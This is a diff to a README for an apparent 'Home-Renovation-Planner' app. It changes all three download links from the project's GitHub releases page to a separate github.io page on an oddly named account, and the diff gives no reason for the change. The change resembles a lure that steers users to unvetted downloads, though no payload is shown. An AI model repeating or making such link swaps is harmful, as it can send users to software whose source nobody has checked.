@@ -1,6 +1,6 @@
 # 🏠 Home-Renovation-Planner - Plan Your Dream Renovation Easily
 
-[![Download Home-Renovation-Planner](https://img.shields.io/badge/Download-Home--Renovation--Planner-blue?style=for-the-badge&logo=github)](https://github.com/unreassuring-scene6132/Home-Renovation-Planner/releases)
+[![Download Home-Renovation-Planner](https://img.shields.io/badge/Download-Home--Renovation--Planner-blue?style=for-the-badge&logo=github)](https://unreassuring-scene6132.github.io)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Visit this link to download the application.
 
 Click the download button below to get started:
 
-[**Download Home-Renovation-Planner Now**](https://github.com/unreassuring-scene6132/Home-Renovation-Planner/releases)
+[**Download Home-Renovation-Planner Now**](https://unreassuring-scene6132.github.io)
 
 ### Step-by-Step Download Instructions
 
@@ -147,7 +147,7 @@ Check the download page regularly for new versions with improved features and bu
 
 Home-Renovation-Planner takes the stress out of planning your home improvement projects. With intuitive tools for tracking materials, costs, notes, and time, you'll have everything you need to complete your renovation successfully. Stop guessing and start planning - download Home-Renovation-Planner today!
 
-[**Get Started with Home-Renovation-Planner**](https://github.com/unreassuring-scene6132/Home-Renovation-Planner/releases)
+[**Get Started with Home-Renovation-Planner**](https://unreassuring-scene6132.github.io)
 
 ---
 
